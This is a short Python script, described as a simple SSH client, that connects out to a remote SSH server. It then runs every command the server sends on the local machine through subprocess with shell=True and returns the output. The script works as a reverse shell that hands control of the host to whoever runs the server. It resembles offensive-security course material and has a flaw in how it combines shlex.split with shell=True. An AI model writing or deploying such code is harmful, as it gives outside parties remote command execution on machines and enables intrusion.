#!/usr/bin/env python3

import paramiko
import shlex
import sys
import subprocess
import argparse

def parser():
	parser = argparse.ArgumentParser(description="Simple SSH Client that connects to python implemented ssh server ..")
	parser.add_argument('-c','--client',type=str,default='127.0.0.1',help="SSH server IP to connect ..")
	parser.add_argument('-p','--port',type=int,default=1337,help='SSH server listening port to connect ..')
	parser.add_argument('-u','--user',type=str,help="SSH Username to connect to .")

	args = parser.parse_args()

	if not args.user:
		parser.print_help()
		sys.exit(1)

	return args

def ssh_client(user,password,ip,port,msg):
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(ip,port=port,username=user,password=password)

	session = client.get_transport().open_session()

	if session.active:
		session.send(msg)
		print(session.recv(1024))

		while True:
			cmd = session.recv(1024)
			cmd = cmd.strip()
			try:
				cmd = cmd.decode()
				if cmd == 'exit':
					client.close()
					break
				output = subprocess.check_output(shlex.split(cmd),shell=True)
				session.send(output or 'okay')
			except Exception as e:
				print(f"[!] Some error occured : {e}")
				sys.exit(1)

		client.close()

if __name__ == '__main__':
	import getpass
	args = parser()	
	password = getpass.getpass()
	user = args.user
	ip = args.client
	port = args.port

	ssh_client(user,password,ip,port,'Client_Connected')